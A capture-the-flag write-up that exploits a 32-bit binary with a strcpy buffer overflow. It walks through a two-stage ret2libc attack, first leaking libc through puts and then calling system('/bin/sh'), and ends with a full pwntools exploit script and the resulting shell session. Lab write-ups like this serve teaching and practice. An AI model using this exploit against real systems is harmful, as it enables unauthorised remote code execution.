# CTF Writeup — Smash (Challenge 7)

> **nc 10.0.118.104 3377**  
> Binaries provided: `hello` (32-bit ELF), `libc-2.23.so`

---

## Binary Reconnaissance

```
$ file hello
hello: ELF 32-bit LSB executable, Intel i386, dynamically linked, not stripped

$ checksec --file=hello
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

Key takeaways:

| Protection      | Status     | Implication                                                 |
| --------------- | ---------- | ----------------------------------------------------------- |
| Stack canary    | ❌ Absent  | Can overwrite return address without detection              |
| NX (No-eXecute) | ✅ Enabled | Cannot inject and run shellcode on the stack                |
| PIE             | ❌ Absent  | All binary addresses are fixed at compile time              |
| RELRO           | Partial    | GOT entries are writable (useful for GOT overwrite attacks) |

---

## Source Code

```c
void say_hello(char *name)
{
    char buffer[128];

    strcpy(buffer, name);     // [1] overflow
    printf("Hello, ");
    printf(buffer);           // [2] format string
    puts("!");
}

int main()
{
    /* reads input char-by-char into a heap buffer, calls say_hello */
    ...
    say_hello(name);
    free(name);
    return 0;
}
```

---

## Vulnerabilities

### 1. Stack Buffer Overflow — `strcpy`

`say_hello` declares a **128-byte stack buffer** and copies user input into it with `strcpy`, which performs **no bounds checking**. If the input is longer than 128 bytes, it overwrites adjacent stack data — including the saved EBP and, crucially, the **saved return address**.

```
Stack layout inside say_hello (grows downward):
 ┌─────────────────────────────┐  ← high addresses
 │   return address (4 bytes)  │  ← overwrite this to redirect execution
 │   saved EBP     (4 bytes)   │
 │   buffer[0..127] (128 bytes)│  ← strcpy writes here, can blow past end
 └─────────────────────────────┘  ← low addresses / ESP
```

Total padding needed to reach the return address: **128 + 4 = 132 bytes**.

This is confirmed by GDB: sending 290+ `A`s crashes with `eip = 0x41414141`.

```
(gdb) info registers
eip  0x41414141   ← 'AAAA' — we fully control the return address
ebp  0x41414141
```

### 2. Format String — `printf(buffer)`

The buffer is passed **directly** as the format string argument to `printf`. This lets an attacker use format specifiers (`%p`, `%s`, `%n`) to leak or write arbitrary memory. In this exploit we rely on the overflow instead, but the format string bug is also present.

---

## Exploitation Strategy

NX is enabled, so we **cannot run shellcode on the stack**. Instead we use **ret2libc**: redirect execution to libc functions that are already mapped into the process.

The obstacle is that the **libc base address is randomised by ASLR** at every run. We must first **leak** the real address of a libc function, compute the base, then call `system("/bin/sh")`.

The plan is two-stage, using a single persistent TCP connection:

```
Stage 1 — Leak libc
  overflow → puts(puts@GOT) → return to main
              ↑ prints 4 raw bytes = real puts address

Stage 2 — Shell
  overflow → system("/bin/sh") → exit
```

---

## Step-by-Step Exploit

### Step 0 — Identify fixed addresses (no PIE)

Because PIE is disabled, every address in the `hello` binary is **the same on every run**.

```
(gdb) info functions
0x080484c0  puts@plt          ← PLT stub that calls puts via GOT
0x08048639  main              ← we return here after Stage 1 leak
...

(gdb) objdump -R hello
0804a024 R_386_JUMP_SLOT   puts@GLIBC_2.0   ← GOT entry for puts
```

We also need libc symbol **offsets** (constant inside a given libc build):

```
$ readelf -s libc-2.23.so | grep -E " puts@@| system@@| exit@@"
  434: 0005f150  puts@@GLIBC_2.0
 1457: 0003a950  system@@GLIBC_2.0
  141: 0002e7c0  exit@@GLIBC_2.0

$ strings -a -t x libc-2.23.so | grep "/bin/sh"
 15912b /bin/sh
```

### Step 1 — Stage 1: Leak the real `puts` address

We send a 132-byte padding followed by a fake stack frame that calls `puts@PLT` with `puts@GOT` as the argument, then returns to `main`:

```
payload1 = b'A' * 132          # fill buffer + overwrite saved EBP
         + p32(puts_plt)       # new return address → puts@PLT
         + p32(main_addr)      # puts' return address → back to main
         + p32(puts_got)       # puts' argument → &GOT[puts]
```

**Memory layout at the moment `say_hello` executes `ret`:**

```
ESP →  [ puts@PLT   ]  ← popped into EIP  (execution jumps to puts)
       [ main_addr  ]  ← puts will ret here
       [ puts@GOT   ]  ← puts reads this as its argument
```

`puts(puts@GOT)` prints the **4 raw bytes** stored at the GOT entry (= the real runtime address of `puts`) followed by a newline. We read those 4 bytes and compute:

```python
puts_real = u32(io.recvn(4))
libc_base = puts_real - libc.symbols['puts']   # offset 0x5f150
```

All other libc addresses follow:

```python
system_addr = libc_base + libc.symbols['system']   # offset 0x3a950
exit_addr   = libc_base + libc.symbols['exit']     # offset 0x2e7c0
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))  # offset 0x15912b
```

**Example values from a live run:**

```
[*] puts      @ 0xf7df0150
[*] libc base @ 0xf7d91000      (= 0xf7df0150 - 0x5f150)
[*] system    @ 0xf7dcb950
[*] /bin/sh   @ 0xf7eea12b
```

### Step 2 — Stage 2: Call `system("/bin/sh")`

After the Stage 1 `ret` chain, execution has looped back to `main`, which prints `"What's your name?"` again. We send a second payload:

```python
payload2 = b'A' * 132          # same overflow padding
         + p32(system_addr)    # new return address → system()
         + p32(exit_addr)      # system's return address → clean exit
         + p32(binsh_addr)     # system's argument → "/bin/sh"
```

**Stack at `say_hello`'s `ret` for Stage 2:**

```
ESP →  [ system    ]  ← EIP jumps here
       [ exit      ]  ← system returns here (clean exit)
       [ "/bin/sh" ]  ← system's first argument
```

`system("/bin/sh")` spawns a shell on the remote host.

---

## Final Exploit Script

```python
from pwn import *

HOST = '10.0.118.104'
PORT = 3377

elf  = ELF('./bin/hello')
libc = ELF('./bin/libc-2.23.so')

puts_plt  = elf.plt['puts']    # 0x080484c0
puts_got  = elf.got['puts']    # 0x0804a024
main_addr = 0x08048639
OFFSET    = 132                # 128-byte buffer + 4-byte saved EBP

# ── Stage 1: leak ────────────────────────────────────────────────────────────
io = remote(HOST, PORT)
io.recvuntil(b"What's your name?\n")

payload1  = b'A' * OFFSET
payload1 += p32(puts_plt)
payload1 += p32(main_addr)
payload1 += p32(puts_got)
io.sendline(payload1)

io.recvuntil(b'!\n')
puts_real   = u32(io.recvn(4))
libc_base   = puts_real - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
exit_addr   = libc_base + libc.symbols['exit']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

log.info(f'libc base @ {hex(libc_base)}')

# ── Stage 2: shell ───────────────────────────────────────────────────────────
io.recvuntil(b"What's your name?\n")

payload2  = b'A' * OFFSET
payload2 += p32(system_addr)
payload2 += p32(exit_addr)
payload2 += p32(binsh_addr)
io.sendline(payload2)

io.interactive()
```

---

## Result

```
$ python3 7-hello.py

[*] libc base @ 0xf7d91000
[*] system    @ 0xf7dcb950
[*] /bin/sh   @ 0xf7eea12b
[*] Switching to interactive mode
$ ls
flag.txt  hello  start.sh
$ cat flag.txt
cns431ctf{0oops_5up32_m4210_5m45h_8202}
```

---

## Summary

| Step | What                                                    | Why                                             |
| ---- | ------------------------------------------------------- | ----------------------------------------------- |
| 1    | Identify buffer size (128) and offset to ret addr (132) | GDB disassembly + crash with cyclic pattern     |
| 2    | Choose ret2libc over shellcode                          | NX prevents executing stack data                |
| 3    | Stage 1: overflow to `puts(puts@GOT)` → `main`          | Leak real libc address, defeat ASLR             |
| 4    | Compute libc base from leaked `puts` address            | All libc symbols at fixed offsets inside the SO |
| 5    | Stage 2: overflow to `system("/bin/sh")`                | Spawn shell using now-known addresses           |
